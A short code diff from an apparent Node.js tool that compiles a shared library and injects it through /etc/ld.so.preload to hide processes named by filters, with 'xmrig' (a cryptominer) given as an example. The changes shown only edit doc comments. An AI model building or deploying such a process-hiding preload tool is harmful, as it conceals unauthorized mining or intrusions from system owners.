@@ -19,7 +19,7 @@ const injectFilePath = "/etc/ld.so.preload";
 
 /**
  * @name setProcessFilters
- * @description Build c file
+ * @description Build c file.
  * @param {Array} processFileters Process name filters. Like ["xmrig", "tmux"]
  */
 function configue(processFileters) {
@@ -40,7 +40,7 @@ function configue(processFileters) {
 
 /**
  * @name compile
- * @description Compile dynamic library
+ * @description Compile dynamic library.
  */
 function compile() {
   shell.exec(`gcc -Wall -fPIC -shared -o ${buildFilePath} ${sourceFilePath} -ldl`);
@@ -58,6 +58,10 @@ function install() {
   }
 }
 
+/**
+ * @name uninstall
+ * @description Remove dynamic libs and cache file.
+ */
 function uninstall() {
   shell.sed("-i", libFilePath, "", injectFilePath);
   shell.rm("-rf", libFilePath);
